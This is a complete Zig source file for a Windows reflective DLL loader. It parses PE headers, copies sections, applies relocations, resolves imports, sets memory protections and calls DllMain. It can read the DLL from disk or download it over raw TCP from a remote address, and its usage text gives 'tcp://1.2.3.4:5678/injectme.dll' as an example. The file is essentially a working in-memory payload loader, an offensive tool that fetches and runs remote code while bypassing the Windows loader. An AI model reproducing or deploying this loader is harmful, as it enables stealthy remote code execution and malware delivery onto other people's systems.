// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};
const utility = @import("lib/utility.zig");

const std = @import("std");
const win32 = @import("win32").everything;
const windows = std.os.windows;

const DLLEntry = (*const fn (win32.HINSTANCE, u32, ?windows.LPVOID) callconv(.winapi) win32.BOOL);
const INVALID_FILESIZE: u32 = 0xFFFFFFFF;

const BASE_RELOCATION_ENTRY = packed struct(u16) {
    Offset: u12,
    Type: u4,
};

// upstream has alignment which fucks the struct with extra padding...
const IMAGE_OPTIONAL_HEADER64 = extern struct {
    Magic: win32.IMAGE_OPTIONAL_HEADER_MAGIC align(4),
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32 align(4),
    SizeOfInitializedData: u32 align(4),
    SizeOfUninitializedData: u32 align(4),
    AddressOfEntryPoint: u32 align(4),
    BaseOfCode: u32 align(4),
    ImageBase: u64 align(4),
    SectionAlignment: u32 align(4),
    FileAlignment: u32 align(4),
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32 align(4),
    SizeOfImage: u32 align(4),
    SizeOfHeaders: u32 align(4),
    CheckSum: u32 align(4),
    Subsystem: win32.IMAGE_SUBSYSTEM,
    DllCharacteristics: win32.IMAGE_DLL_CHARACTERISTICS,
    SizeOfStackReserve: u64 align(4),
    SizeOfStackCommit: u64 align(4),
    SizeOfHeapReserve: u64 align(4),
    SizeOfHeapCommit: u64 align(4),
    /// Deprecated
    LoaderFlags: u32 align(4),
    NumberOfRvaAndSizes: u32 align(4),
    DataDirectory: [16]win32.IMAGE_DATA_DIRECTORY,
};

const IMAGE_NT_HEADERS64 = extern struct {
    Signature: u32,
    FileHeader: win32.IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_ORDINAL_FLAG64: usize = 0x8000000000000000;
fn IMAGE_SNAP_BY_ORDINAL64(Ordinal: usize) bool {
    return (Ordinal & IMAGE_ORDINAL_FLAG64) != 0;
}

const FILE_TYPE = enum(u2) {
    SHARE,
    TCP,
};

const Action = struct {
    const Self = @This();

    const Error = error{
        UnknownError,
    };

    dll: [:0]u8,
    file_type: FILE_TYPE,
    ip: []u8,
    port: u16,
    allocator: std.mem.Allocator,
    io: std.Io,

    pub fn init(allocator: std.mem.Allocator, io: std.Io) !Self {
        return Self{
            .dll = undefined,
            .file_type = undefined,
            .ip = undefined,
            .port = 0,
            .allocator = allocator,
            .io = io,
        };
    }

    // big thanks to https://0xrick.github.io/win-internals/pe1/

    pub fn reflect(self: *Self) !i32 {
        std.log.debug("[+] reflect called", .{});
        var dllBytes: []u8 = undefined;
        var dllSize: u32 = 0;

        // get this module's image base address
        // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        // const imagebase = win32.GetModuleHandleA(null);
        // if (imagebase == null) {
        //     std.log.err("[-] Failed to get imagebase :: {d}", .{@intFromEnum(win32.GetLastError())});
        //     return Error.UnknownError;
        // }
        // defer utility.closeHandle(imagebase);
        // std.log.debug("imagebase :: {any}", .{@intFromPtr(imagebase)});

        switch (self.file_type) {
            .SHARE => {
                std.log.debug("Reading file {s}", .{self.dll});

                const dir = std.Io.Dir.cwd();
                dllBytes = try dir.readFileAlloc(
                    self.io,
                    self.dll,
                    self.allocator,
                    .unlimited,
                );
                // defer self.allocator.free(dllBytes);
                std.debug.print("{d} bytes", .{dllBytes.len});

                dllSize = @intCast(dllBytes.len);

                std.log.debug("dllSize: 0x{x}", .{dllSize});
            },
            .TCP => {
                std.log.debug("Connecting to server {s}:{d}", .{ self.ip, self.port });
                const addr = try std.Io.net.IpAddress.parse(self.ip, self.port);
                const stream = try addr.connect(self.io, .{
                    .mode = .stream,
                });
                defer stream.close(self.io);

                // Backing buffer for the reader (must be >= largest single read)
                var read_buf: [4096]u8 = undefined;
                var stream_reader = stream.reader(self.io, &read_buf);
                const reader: *std.Io.Reader = &stream_reader.interface;

                // Read u32 size prefix
                std.log.debug("Reading size", .{});
                reader.fill(@sizeOf(u32)) catch {
                    std.log.err("[-] Failed to read DLL size", .{});
                    return Error.UnknownError;
                };
                dllSize = try reader.takeInt(u32, .big);

                std.log.debug("Read size: {d}", .{dllSize});

                // Sanity check before trusting the network-supplied size
                const MAX_DLL_SIZE: u32 = 64 * 1024 * 1024; // 64 MB
                const MIN_DLL_SIZE: u32 = 64; // a valid PE is never this small...right?

                if (dllSize < MIN_DLL_SIZE or dllSize > MAX_DLL_SIZE) {
                    std.log.err("[-] DLL size {d} out of acceptable range [{d}, {d}]", .{
                        dllSize, MIN_DLL_SIZE, MAX_DLL_SIZE,
                    });
                    return Error.UnknownError;
                }

                const dll = self.allocator.alloc(u8, dllSize) catch |err| {
                    std.log.err("[-] Failed to allocate {d} bytes for DLL: {}", .{ dllSize, err });
                    return Error.UnknownError;
                };
                errdefer self.allocator.free(dll); // clean up if the read below fails

                try reader.readSliceAll(dll);

                dllBytes = dll;
            },
        }

        std.log.info("start...", .{});

        // get pointers to in-memory DLL headers
        const dllBytesAddr = @intFromPtr(dllBytes.ptr);
        const base: usize = @intFromPtr(dllBytes.ptr);
        const DOSHeader = @as(*const win32.IMAGE_DOS_HEADER, @ptrCast(@alignCast(dllBytes.ptr)));
        std.log.debug("DOSHeader.e_lfanew: 0x{x}", .{DOSHeader.*.e_lfanew});
        const NTHeaderOffset: u32 = @intCast(DOSHeader.*.e_lfanew);
        const offset: usize = @intFromPtr(DOSHeader) + NTHeaderOffset;
        std.log.debug("offset: 0x{x}", .{offset - base});
        const NTHeader = @as(*const IMAGE_NT_HEADERS64, @ptrFromInt(offset)).*;
        const DLLImageBase: usize = NTHeader.OptionalHeader.ImageBase;
        const DLLImageSize: usize = NTHeader.OptionalHeader.SizeOfImage;

        std.log.debug("SizeOfCode :: 0x{x}\n", .{NTHeader.OptionalHeader.SizeOfCode});

        std.log.debug("base :: 0x{x}", .{base});
        std.log.debug("NTHeaderOffset :: 0x{x}", .{NTHeaderOffset});
        std.log.debug("NTHeader.ImageBase 0x{x}", .{DLLImageBase});
        std.log.debug("NTHeader.SizeOfImage 0x{x} // 0x{x}", .{ DLLImageSize, dllSize });
        std.log.debug("NTHeader.SizeOfOptionalHeader 0x{x}", .{NTHeader.FileHeader.SizeOfOptionalHeader});

        const rawBytes: []const u8 = @as([*]u8, @ptrCast(@alignCast(dllBytes.ptr)))[0..dllSize];
        std.log.debug("PE Magic :: 0x{x}", .{rawBytes[0x0..0x4]});
        std.log.debug("NTHeader SizeOfImage :: 0x{x}", .{rawBytes[0x78..0x7C]});

        // allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
        // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
        var dllBase = win32.VirtualAlloc(
            @ptrFromInt(DLLImageBase),
            DLLImageSize,
            win32.VIRTUAL_ALLOCATION_TYPE{ .RESERVE = 1, .COMMIT = 1 },
            win32.PAGE_READWRITE,
        );
        if (dllBase == null) {
            dllBase = win32.VirtualAlloc(
                null,
                DLLImageSize,
                win32.VIRTUAL_ALLOCATION_TYPE{ .RESERVE = 1, .COMMIT = 1 },
                win32.PAGE_READWRITE,
            );

            if (dllBase == null) {
                std.log.err("[-] Failed VirtualAlloc({d}) :: {d}", .{ DLLImageSize, @intFromEnum(win32.GetLastError()) });
                return Error.UnknownError;
            }
        }

        const dllBaseAddr: usize = @intFromPtr(dllBase);
        // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex
        defer _ = win32.VirtualFreeEx(
            win32.GetCurrentProcess(),
            dllBase,
            0,
            win32.MEM_RELEASE,
        );

        const dllBaseBytes: []u8 = @as([*]u8, @ptrCast(dllBase))[0..DLLImageSize];

        // get delta between this module's image base and the DLL that was read into memory
        const deltaImageBase: usize = @intFromPtr(dllBase) - DLLImageBase;
        std.log.debug("dllBase :: 0x{x}", .{@intFromPtr(dllBase.?)});
        std.log.debug("deltaImageBase :: 0x{x}", .{deltaImageBase});

        // copy over DLL image headers to the newly allocated space for the DLL
        @memcpy(dllBaseBytes[0..NTHeader.OptionalHeader.SizeOfHeaders], rawBytes[0..NTHeader.OptionalHeader.SizeOfHeaders]);

        // copy over DLL image sections to the newly allocated space for the DLL
        const sections: [*]win32.IMAGE_SECTION_HEADER = @ptrFromInt(dllBaseAddr +
            NTHeaderOffset +
            @offsetOf(win32.IMAGE_NT_HEADERS64, "OptionalHeader") +
            NTHeader.FileHeader.SizeOfOptionalHeader);
        std.log.debug("section start :: 0x{x}", .{@intFromPtr(&sections)});

        var idx: u32 = 0;
        while (idx < NTHeader.FileHeader.NumberOfSections) : (idx += 1) {
            std.log.debug("Loading {s} at 0x{x} // {any}", .{ sections[idx].Name, sections[idx].VirtualAddress, sections[idx].PointerToRawData });
            const sectionBytes: []u8 = @as([*]u8, @ptrFromInt(dllBytesAddr + sections[idx].PointerToRawData))[0..sections[idx].SizeOfRawData];
            @memcpy(dllBaseBytes[sections[idx].VirtualAddress .. sections[idx].VirtualAddress + sections[idx].SizeOfRawData], sectionBytes[0..sections[idx].SizeOfRawData]);
        }

        // perform image base relocations
        const relocations: win32.IMAGE_DATA_DIRECTORY = NTHeader.OptionalHeader.DataDirectory[@intFromEnum(win32.IMAGE_DIRECTORY_ENTRY_BASERELOC)];
        const relocationTable: usize = dllBaseAddr + relocations.VirtualAddress;
        std.log.debug("relocationTable: {x} ", .{relocationTable});

        var relocationsProcessed: usize = 0;
        var relocationBlock: *align(1) win32.IMAGE_BASE_RELOCATION = @ptrFromInt(relocationTable + relocationsProcessed);
        while (relocationBlock.VirtualAddress != 0) {
            std.log.debug("[!] Process Relations :: {x} of {x}", .{ relocationBlock.VirtualAddress, relocationBlock.SizeOfBlock });
            relocationsProcessed += relocationBlock.SizeOfBlock;
            const relocationsCount = (relocationBlock.SizeOfBlock - @sizeOf(win32.IMAGE_BASE_RELOCATION)) / @sizeOf(BASE_RELOCATION_ENTRY);
            const relocationEntries: [*]BASE_RELOCATION_ENTRY = @ptrFromInt(relocationTable + relocationsProcessed);

            std.log.debug("relocations: {x}", .{relocationsCount});
            idx = 0;
            while (idx < relocationsCount) : (idx += 1) {
                // std.log.debug("relocationEntries[{d}].Type :: {d}", .{ idx, relocationEntries[idx].Type });

                if (relocationEntries[idx].Type == win32.IMAGE_REL_BASED_ABSOLUTE) {
                    std.log.debug("[!] Skipping relocation", .{});
                    continue;
                }

                if (relocationEntries[idx].Type != win32.IMAGE_REL_BASED_HIGHLOW and relocationEntries[idx].Type != win32.IMAGE_REL_BASED_DIR64) {
                    std.log.debug("[!] Skipping relocation", .{});
                    continue;
                }

                const addressToPatch: *align(1) usize = @ptrFromInt(dllBaseAddr + relocationBlock.VirtualAddress + relocationEntries[idx].Offset);
                addressToPatch.* += deltaImageBase;
            }
            relocationBlock = @ptrFromInt(relocationTable + relocationsProcessed);
        }

        std.log.debug("[+] Resolve AIT", .{});

        // resolve import address table
        const imports: win32.IMAGE_DATA_DIRECTORY = NTHeader.OptionalHeader.DataDirectory[@intFromEnum(win32.IMAGE_DIRECTORY_ENTRY_IMPORT)];
        var importDescriptor: *win32.IMAGE_IMPORT_DESCRIPTOR = @ptrFromInt(dllBaseAddr + imports.VirtualAddress);
        idx = 1;

        while (importDescriptor.Name != 0) : (idx += 1) {
            const libraryName: ?[*:0]const u8 = @ptrFromInt(dllBaseAddr + importDescriptor.Name);
            // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
            const library = win32.LoadLibraryA(libraryName);

            if (library == null) {
                std.log.err("[-] Failed LoadLibraryA({s}) :: {d}", .{ libraryName.?, @intFromEnum(win32.GetLastError()) });
            } else {
                var thunk: *win32.IMAGE_THUNK_DATA64 = @ptrFromInt(dllBaseAddr + importDescriptor.FirstThunk);
                var i: usize = 1;

                while (thunk.u1.AddressOfData != 0) : (i += 1) {
                    std.log.debug("Thunk[{d}] == {x}", .{ i, thunk.u1.AddressOfData });
                    if (IMAGE_SNAP_BY_ORDINAL64(thunk.u1.Ordinal)) {
                        std.log.debug("thunk.u1.Ordinal & 0xffff:: {x}", .{thunk.u1.Ordinal & 0xffff});
                        const functionOrdinal: ?[*:0]const u8 = @ptrFromInt(thunk.u1.Ordinal & 0xffff);
                        std.log.debug("GPA.snap: {s}", .{functionOrdinal.?});
                        thunk.u1.Function = @intFromPtr(win32.GetProcAddress(library, functionOrdinal));
                    } else {
                        const functionName: *win32.IMAGE_IMPORT_BY_NAME = @ptrFromInt(dllBaseAddr + thunk.u1.AddressOfData);
                        const functionOrdinal: ?[*:0]const u8 = @ptrCast(&functionName.Name);
                        std.log.debug("GPA: {x} // {s}", .{ functionName.Hint, functionOrdinal.? });
                        thunk.u1.Function = @intFromPtr(win32.GetProcAddress(library, functionOrdinal));
                    }
                    thunk = @ptrFromInt(dllBaseAddr + importDescriptor.FirstThunk + @sizeOf(win32.IMAGE_THUNK_DATA64) * i);
                }
            }

            importDescriptor = @ptrFromInt(dllBaseAddr + imports.VirtualAddress + @sizeOf(win32.IMAGE_IMPORT_DESCRIPTOR) * idx);
        }

        // TODO: Process delayed imports

        // Set memory protections on sections
        idx = 0;
        while (idx < NTHeader.FileHeader.NumberOfSections) : (idx += 1) {
            std.log.debug("Finalizing {s} at 0x{x} // {any}", .{ sections[idx].Name, sections[idx].VirtualAddress, sections[idx].PointerToRawData });
            var newSectionProtection: win32.PAGE_PROTECTION_FLAGS = win32.PAGE_PROTECTION_FLAGS{};

            const executable = sections[idx].Characteristics.MEM_EXECUTE == 1;
            const readable = sections[idx].Characteristics.MEM_READ == 1;
            const writeable = sections[idx].Characteristics.MEM_WRITE == 1;

            if (!executable and !readable and !writeable) {
                newSectionProtection.PAGE_NOACCESS = 1;
            } else if (!executable and !readable and writeable) {
                newSectionProtection.PAGE_WRITECOPY = 1;
            } else if (!executable and readable and !writeable) {
                newSectionProtection.PAGE_READONLY = 1;
            } else if (!executable and readable and writeable) {
                newSectionProtection.PAGE_READWRITE = 1;
            } else if (executable and !readable and writeable) {
                newSectionProtection.PAGE_EXECUTE_WRITECOPY = 1;
            } else if (executable and readable and !writeable) {
                newSectionProtection.PAGE_EXECUTE_READ = 1;
            } else {
                newSectionProtection.PAGE_EXECUTE_READWRITE = 1;
            }

            if (sections[idx].Characteristics.MEM_NOT_CACHED == 1) {
                newSectionProtection.PAGE_NOCACHE = 1;
            }

            var oldSectionProtection: win32.PAGE_PROTECTION_FLAGS = win32.PAGE_PROTECTION_FLAGS{};

            // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
            if (0 == win32.VirtualProtect(
                @ptrFromInt(dllBaseAddr + sections[idx].VirtualAddress),
                sections[idx].SizeOfRawData,
                newSectionProtection,
                &oldSectionProtection,
            )) {
                std.log.err("[-] Failed VirtualProtect({s}) :: {d}", .{ sections[idx].Name, @intFromEnum(win32.GetLastError()) });
                return Error.UnknownError;
            }
        }

        // TODO: TLS callbacks
        // TODO: Register exception handlers on 64 bit

        _ = win32.FlushInstructionCache(null, null, 0);

        const DLLMain: DLLEntry = @ptrFromInt(dllBaseAddr + NTHeader.OptionalHeader.AddressOfEntryPoint);

        // execute the loaded DLL
        const ret = @as(DLLEntry, DLLMain)(
            @ptrFromInt(dllBaseAddr),
            win32.DLL_PROCESS_ATTACH,
            null,
        );

        std.log.debug("Ret: {d}", .{ret});

        return ret;
    }

    pub fn debug(self: *Self) void {
        std.log.info("\nAttempt to inject {s}\n", .{self.dll});
    }

    pub fn parseDLL(self: *Self, line: [:0]const u8) !void {
        self.file_type = FILE_TYPE.SHARE;

        if (std.mem.startsWith(u8, line, "tcp://")) {
            self.file_type = FILE_TYPE.TCP;

            var iter = std.mem.splitAny(u8, line[6..], ":");
            self.ip = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{iter.next().?}, 0);
            errdefer self.allocator.free(self.ip);
            self.port = std.fmt.parseInt(u16, iter.next().?, 10) catch 55555;

            self.dll = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{""}, 0);
            errdefer self.allocator.free(self.dll);
        } else {
            self.ip = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{""}, 0);
            errdefer self.allocator.free(self.ip);
            self.port = 0;

            self.dll = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{line}, 0);
            errdefer self.allocator.free(self.dll);
        }
    }

    pub fn deinit(self: *Self) void {
        defer self.allocator.free(self.dll);
        defer self.allocator.free(self.ip);
    }
};

pub fn usage(
    allocator: std.mem.Allocator,
    io: std.Io,
    argv: [:0]const u8,
) !void {
    const buffer: []u8 = try std.fmt.allocPrint(allocator,
        \\
        \\Example:
        \\
        \\ Attempt to load a DLL
        \\ .\\{s} C:\\windows\\temp\\injectme.dll
        \\ .\\{s} tcp://1.2.3.4:5678/injectme.dll
        \\
        \\ Show this menu
        \\ .\\{s} -h
        \\
    , .{ argv, argv, argv });

    try std.Io.File.stdout().writeStreamingAll(io, buffer);

    std.process.exit(0);
}

pub fn main(init: std.process.Init) !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const args = try init.minimal.args.toSlice(init.arena.allocator());

    if (args.len < 2) {
        try usage(allocator, init.io, args[0]);
    }

    var action = try Action.init(allocator, init.io);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parseDLL(arg);
        }

        i += 1;
    }

    action.debug();

    const exitcode = try action.reflect();

    if (exitcode != 0) {
        std.log.info("[+] Success {d}", .{exitcode});
    } else {
        std.log.info("[+] Failure...", .{});
    }

    win32.ExitProcess(@intCast(exitcode));
}
